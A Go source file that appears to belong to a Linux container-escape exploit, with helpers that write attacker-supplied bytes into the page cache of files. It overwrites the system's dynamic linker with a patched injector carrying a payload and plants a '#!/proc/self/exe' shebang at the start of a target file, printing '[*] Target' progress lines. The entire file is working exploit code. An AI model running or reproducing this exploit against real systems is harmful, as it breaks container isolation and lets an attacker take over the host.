//go:build linux

package main

import (
	"fmt"
	"os"

	"page-cache-container-escape/internal/copyfail"
)

const selfShebang = "#!/proc/self/exe\n"

func pageCacheWrite(path string, offset int64, content []byte) error {
	return copyfail.Write(path, offset, content, copyfail.Write4)
}

func writeInjectorBytes(injector []byte) error {
	target, err := ensureLinker(len(injector))
	if err != nil {
		return err
	}
	info, _ := os.Stat(target)
	fmt.Printf("    [*] Target: %s (%d bytes -> %d bytes)\n", target, info.Size(), len(injector))
	return pageCacheWrite(target, 0, injector)
}

func writeInjector(payload []byte) error {
	injector, err := patchInjector(payload)
	if err != nil {
		return err
	}
	return writeInjectorBytes(injector)
}

func writeShebang(path string) error {
	fmt.Printf("    [*] Target: %s -> %q\n", path, selfShebang)
	return pageCacheWrite(path, 0, []byte(selfShebang))
}
